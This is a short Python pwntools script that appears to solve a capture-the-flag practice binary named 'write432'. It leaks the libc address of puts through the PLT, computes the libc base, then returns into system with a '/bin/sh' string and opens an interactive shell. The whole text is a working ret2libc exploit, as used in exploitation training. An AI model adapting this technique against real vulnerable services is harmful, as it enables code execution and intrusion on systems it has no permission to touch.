from pwn import *

system_plt	= p32(0x08048430)
puts_plt 	= p32(0x08048420)
puts_got 	= p32(0x804a014)
puts_libc_off 	= p32(0x5fca0)
binsh_off	= p32(0x15b9ab)
exit_off	= p32(0x2e9d0)

padding = 'A'*44

payload = padding
payload += puts_plt
payload += p32(0x080485f6) #back to pwnme
payload += puts_got

p=process('./write432')
p.clean()
p.sendline(payload)
ret=p.recv()
puts_libc	= u32(ret[0:4])
libc_base	= puts_libc - 0x5fca0
log.info('libc base: ' + hex(libc_base))

binsh_addr = p32(libc_base + 0x15b9ab)


payload = padding
payload += system_plt
payload += p32(u32(exit_off) + libc_base)
payload += binsh_addr
p.clean()
p.sendline(payload)
p.interactive()
